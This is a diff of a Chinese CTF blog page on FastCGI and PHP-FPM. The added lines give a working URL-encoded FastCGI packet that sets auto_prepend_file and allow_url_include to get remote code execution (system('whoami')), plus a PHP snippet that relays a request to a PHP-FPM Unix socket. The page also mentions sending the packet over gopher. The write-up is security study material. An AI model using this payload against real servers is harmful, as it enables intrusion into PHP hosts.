@@ -6,14 +6,14 @@
   <title>FastCGI浅析 | Twings</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="前言同样是上周的 *CTF 的 Web 题目，题目用 PHP 仿写了函数调用栈，主要思路是栈溢出 + PHP-FPM 绕过 disable_functions，相关的 payload 脚本已经有前辈大师傅们写好了，因为我对 PHP 的几种模式了解得不是很清楚，所以研究学习一下，再写篇文章加以总结。">
-<meta name="keywords" content="CTF,Web">
+<meta name="keywords" content="Web,CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FastCGI浅析">
 <meta property="og:url" content="http://yoursite.com/2019/05/06/FastCGI浅析/index.html">
 <meta property="og:site_name" content="Twings">
 <meta property="og:description" content="前言同样是上周的 *CTF 的 Web 题目，题目用 PHP 仿写了函数调用栈，主要思路是栈溢出 + PHP-FPM 绕过 disable_functions，相关的 payload 脚本已经有前辈大师傅们写好了，因为我对 PHP 的几种模式了解得不是很清楚，所以研究学习一下，再写篇文章加以总结。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-05-06T13:55:15.477Z">
+<meta property="og:updated_time" content="2019-05-07T02:28:04.092Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="FastCGI浅析">
 <meta name="twitter:description" content="前言同样是上周的 *CTF 的 Web 题目，题目用 PHP 仿写了函数调用栈，主要思路是栈溢出 + PHP-FPM 绕过 disable_functions，相关的 payload 脚本已经有前辈大师傅们写好了，因为我对 PHP 的几种模式了解得不是很清楚，所以研究学习一下，再写篇文章加以总结。">
@@ -238,6 +238,12 @@
 <h3 id="PHP-FPM利用方式"><a href="#PHP-FPM利用方式" class="headerlink" title="PHP-FPM利用方式"></a>PHP-FPM利用方式</h3><p>ph 牛早已做过研究：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
 <p>主要的攻击方式：SSRF 发送 TCP 包（TCP），或者通过 stream_socket_client（Unix socket）。</p>
 <p>虽然能执行的只有服务器上已经存在的 PHP 文件，但是我们可以通过设置 auto_prepend_file = php://input 且 allow_url_include = On，然后将 PHP 代码放在 POST body 中即可 RCE。</p>
+<p>我们稍加修改 ph 牛的脚本中的 request 函数，将 开头的连接判断 和 send 注释掉，直接 return request 进行输出即可，system(“whoami”) 的 payload 如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%01%01%C8%0C%00%08%00%00%00%01%00%00%00%00%00%00%01%04%C8%0C%01%DB%00%00%0E%02CONTENT_LENGTH23%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%C8%0C%00%00%00%00%01%05%C8%0C%00%17%00%00%3C%3Fphp%20system%28%22whoami%22%29%3B%01%05%C8%0C%00%00%00%00</span><br></pre></td></tr></table></figure>
+<p>使用 CURL 的 Gopher 协议进行发包，或者也可以使用 socket 进行连接。</p>
+<p>如果 PHP-FPM 使用的是 Unix socket，则需要执行如下的 PHP 代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $sock=stream_socket_client(<span class="string">'unix:///run/php/php7.3-fpm.sock'</span>);fputs($sock, $_GET[<span class="string">'code'</span>]);var_dump(fread($sock, <span class="number">4096</span>));</span><br></pre></td></tr></table></figure>
+<p>然后提交 payload 即可。</p>
 <hr>
 <p>参考文章：</p>
 <p><a href="https://xz.aliyun.com/t/5006#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5006#toc-3</a></p>
@@ -246,7 +252,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/05/06/FastCGI浅析/" data-id="cjvcfjyd7000uesv6hxyb0n9y" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/05/06/FastCGI浅析/" data-id="cjvd6d560000et0v6690jj4lt" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
